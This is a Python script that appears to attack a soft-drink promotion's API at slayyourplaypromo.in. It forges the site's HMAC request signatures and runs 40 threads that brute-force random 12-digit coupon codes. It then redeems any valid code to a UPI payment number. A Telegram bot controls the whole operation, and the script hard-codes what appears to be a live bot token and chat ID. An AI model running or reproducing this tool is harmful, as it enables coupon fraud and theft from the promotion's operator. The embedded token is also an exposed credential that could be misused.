import requests, json, base64, hmac, hashlib, time, urllib.parse, random
import threading, queue, os

# ========== CONFIG ==========
BASE_URL = "https://slayyourplaypromo.in/api/users"
MASTER_KEY = "1709065004"
TELEGRAM_BOT_TOKEN = "8993308025:AAEkw6jC02u_DWcGaILvDRpfMw8oA9LxJsw"
TELEGRAM_CHAT_ID = "6420941417"
THREADS = 40
REQUEST_DELAY = 0.5

FINAL_API_ENDPOINT = "getUpiNo"
# ============================

# Global state
session_active = False
new_session_event = threading.Event()   # Set by listener on /new or /login
next_session_mode = 'full'              # 'full' or 'login'

# Telegram input control
input_state = None          # 'phone', 'otp', 'upi', or None
input_value = None
input_event = threading.Event()

# Statistics for current search (for /stats)
current_stats = {"checked": 0, "invalid": 0, "valid": 0}
current_found_code = None
stats_lock = threading.Lock()

session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"})
session.cookies.set("thumsup_and_sprite-id", MASTER_KEY)

def decrypt_response(resp):
    try: return json.loads(base64.b64decode(resp))
    except: return {}

def hit_api(endpoint, payload, user_key, data_key, access_token=None):
    t = int(time.time() * 1000)
    payload['t'] = t
    payload['userKey'] = user_key
    p = json.dumps(payload, separators=(',', ':'))
    a = base64.b64encode(p.encode()).decode()
    u = base64.b64encode(str(t).encode()).decode()
    h = hmac.new(data_key[4:18].encode(), f"{u}.{a}".encode(), hashlib.sha256).hexdigest()
    f = base64.b64encode(h.encode()).decode()
    g = f"43{f[:3]}{''.join(random.choices('ABCDEF0123456789', k=4))}{f[3:]}"
    data = f"userKey={user_key}&data={urllib.parse.quote_plus(u)}.{urllib.parse.quote_plus(a)}.{urllib.parse.quote_plus(g)}"
    headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}
    if access_token:
        headers["authorization"] = f"Bearer {access_token}"
    r = session.post(f"{BASE_URL}/{endpoint}/{user_key}?t={t}", data=data, headers=headers)
    return r.status_code, decrypt_response(r.json().get('resp', ''))

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print("Telegram send error:", e)

# Global Telegram listener (runs forever)
def telegram_listener():
    global input_state, input_value, input_event, session_active, new_session_event, next_session_mode
    offset = None
    while True:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?timeout=5"
        if offset:
            url += f"&offset={offset}"
        try:
            resp = requests.get(url, timeout=10)
            data = resp.json()
            if not data.get("ok"):
                continue
            for update in data.get("result", []):
                offset = update["update_id"] + 1
                msg = update.get("message")
                if not msg:
                    continue
                chat_id = msg["chat"]["id"]
                text = msg.get("text", "")
                if str(chat_id) != TELEGRAM_CHAT_ID:
                    continue

                # /stats command
                if text.strip().lower() == "/stats":
                    with stats_lock:
                        checked = current_stats["checked"]
                        invalid = current_stats["invalid"]
                        valid = current_stats["valid"]
                        code = current_found_code
                    reply = f"📊 Current search:\n🔹 Checked: {checked}\n❌ Invalid: {invalid}\n✅ Valid: {valid}"
                    if code:
                        reply += f"\n🎉 Found: `{code}`"
                    send_telegram(reply)
                    continue

                # /new command – full session (coupon + UPI)
                if text.strip().lower() == "/new":
                    if not session_active:
                        next_session_mode = 'full'
                        new_session_event.set()
                        send_telegram("🆕 Full session (coupon + UPI) will start...")
                    else:
                        send_telegram("⚠️ A session is already active. Please complete it first.")
                    continue

                # /login command – login‑only session (coupon only, no UPI)
                if text.strip().lower() == "/login":
                    if not session_active:
                        next_session_mode = 'login'
                        new_session_event.set()
                        send_telegram("🔐 Login‑only session (coupon without UPI) will start...")
                    else:
                        send_telegram("⚠️ A session is already active. Please complete it first.")
                    continue

                # If we are waiting for user input (phone, otp, upi)
                if input_state is not None and not input_event.is_set():
                    input_value = text.strip()
                    input_event.set()
        except Exception as e:
            time.sleep(2)

def wait_for_input(prompt, state):
    global input_state, input_value, input_event
    input_state = state
    input_event.clear()
    input_value = None
    send_telegram(prompt)
    input_event.wait()
    return input_value

# ---------- Search worker ----------
def worker(code_queue, stop_event, user_key, data_key, access_token, tested_codes, tested_lock):
    while not stop_event.is_set():
        try:
            code = code_queue.get(timeout=1)
        except queue.Empty:
            break
        if stop_event.is_set():
            code_queue.task_done()
            break
        with tested_lock:
            if code in tested_codes:
                code_queue.task_done()
                continue
            tested_codes.add(code)
        status, resp = hit_api("getCode", {"code": code}, user_key, data_key, access_token)
        if status == 200:
            with stats_lock:
                current_stats["valid"] += 1
                current_stats["checked"] += 1
                current_found_code = code
            stop_event.found_code = code
            stop_event.found_response = resp
            stop_event.set()
            code_queue.task_done()
            break
        else:
            with stats_lock:
                current_stats["invalid"] += 1
                current_stats["checked"] += 1
            with open("invalid_codes.txt", "a") as f:
                f.write(code + "\n")
        code_queue.task_done()
        time.sleep(REQUEST_DELAY)

def code_generator(code_queue, stop_event, tested_codes, tested_lock):
    while not stop_event.is_set():
        new_code = str(random.randint(100000000000, 999999999999))
        with tested_lock:
            if new_code in tested_codes: continue
        code_queue.put(new_code)
        time.sleep(0.01)

# ---------- Main loop ----------
def main():
    global session_active, new_session_event, next_session_mode, current_stats, current_found_code

    # Start Telegram listener (once)
    listener = threading.Thread(target=telegram_listener, daemon=True)
    listener.start()

    # Load previously tested invalid codes (shared across sessions)
    tested_codes = set()
    if os.path.exists("invalid_codes.txt"):
        with open("invalid_codes.txt", "r") as f:
            for line in f:
                line = line.strip()
                if line: tested_codes.add(line)

    # Do NOT start a session automatically – wait for /new or /login
    send_telegram("👋 Bot is ready. Send /new for full session or /login for coupon‑only session.")

    while True:
        # Wait for /new or /login command
        new_session_event.wait()
        new_session_event.clear()
        session_active = True
        mode = next_session_mode

        # Reset current search stats
        with stats_lock:
            current_stats = {"checked": 0, "invalid": 0, "valid": 0}
            current_found_code = None

        send_telegram("🔄 Starting new session...")

        # ---------- Registration ----------
        res = session.post(BASE_URL, json={"masterKey": MASTER_KEY}).json()
        init = decrypt_response(res.get('resp', ''))
        if not init:
            send_telegram("❌ Initial registration failed. Retrying...")
            session_active = False
            continue
        user_key = str(init['userKey'])
        data_key = init['dataKey']

        hit_api("clickTrack", {}, user_key, data_key)

        # Phone number from Telegram
        phone = wait_for_input("📱 Please send your 10-digit mobile number:", 'phone')
        send_telegram(f"✅ Received mobile: `{phone}`")
        hit_api("register", {"mobile": phone}, user_key, data_key)

        # OTP
        otp = wait_for_input("🔐 OTP has been sent. Please enter the OTP:", 'otp')
        send_telegram("⏳ Verifying OTP...")
        _, v = hit_api("verifyOTP", {"otp": otp}, user_key, data_key)
        access_token = v.get('accessToken')
        if v.get('userKey'):
            user_key = str(v['userKey'])

        # Pack/Vibe
        s1, _ = hit_api("selectPack", {"pack": "full"}, user_key, data_key, access_token)
        s2, _ = hit_api("selectVibe", {"vibe": "soft savage"}, user_key, data_key, access_token)
        if s1 != 200 or s2 != 200:
            send_telegram("❌ Pack/Vibe selection failed. Session ended.")
            session_active = False
            continue

        send_telegram("✅ Session ready. Searching for coupons...")

        # ---------- Search ----------
        stop_event = threading.Event()
        stop_event.found_code = None
        stop_event.found_response = None
        tested_lock = threading.Lock()
        code_queue = queue.Queue(maxsize=1000)

        generator = threading.Thread(target=code_generator, args=(code_queue, stop_event, tested_codes, tested_lock))
        generator.daemon = True
        generator.start()

        threads = []
        for _ in range(THREADS):
            t = threading.Thread(target=worker, args=(code_queue, stop_event, user_key, data_key, access_token, tested_codes, tested_lock))
            t.daemon = True
            t.start()
            threads.append(t)

        # Wait for coupon found
        while not stop_event.is_set():
            time.sleep(0.5)

        # Drain queue
        while not code_queue.empty():
            try:
                code_queue.get_nowait()
                code_queue.task_done()
            except queue.Empty:
                break
        for t in threads:
            t.join(timeout=2)

        if not stop_event.found_code:
            send_telegram("❌ Search stopped unexpectedly. Session ended.")
            session_active = False
            continue

        code = stop_event.found_code
        resp_json = stop_event.found_response

        # Send valid code details
        send_telegram(f"🎉 *Valid code found!*\n\n`{code}`\n\nResponse:\n```json\n{json.dumps(resp_json, indent=2, ensure_ascii=False)}\n```")

        # ---------- UPI step (only in 'full' mode) ----------
        if mode == 'full':
            while True:
                upi = wait_for_input("💳 Please enter your UPI number:", 'upi')
                send_telegram(f"✅ UPI `{upi}` received. Hitting final API...")

                final_status, final_resp = hit_api(FINAL_API_ENDPOINT, {"upiNo": upi}, user_key, data_key, access_token)
                if final_status == 200:
                    send_telegram(f"✅ *Final API success!*\n```json\n{json.dumps(final_resp, indent=2, ensure_ascii=False)}\n```")
                    break
                else:
                    send_telegram(f"❌ Final API failed (status {final_status}).\nResponse: {json.dumps(final_resp, indent=2)}")
                    send_telegram("⚠️ Please try a different UPI number.")
        else:
            # Login mode – no UPI
            send_telegram("🔐 Login‑only session complete. Coupon redeemed, no UPI requested.")

        # Session ended successfully
        session_active = False
        send_telegram("🏁 Session ended. Send /new for full session, /login for coupon‑only session.")

if __name__ == "__main__":
    main()
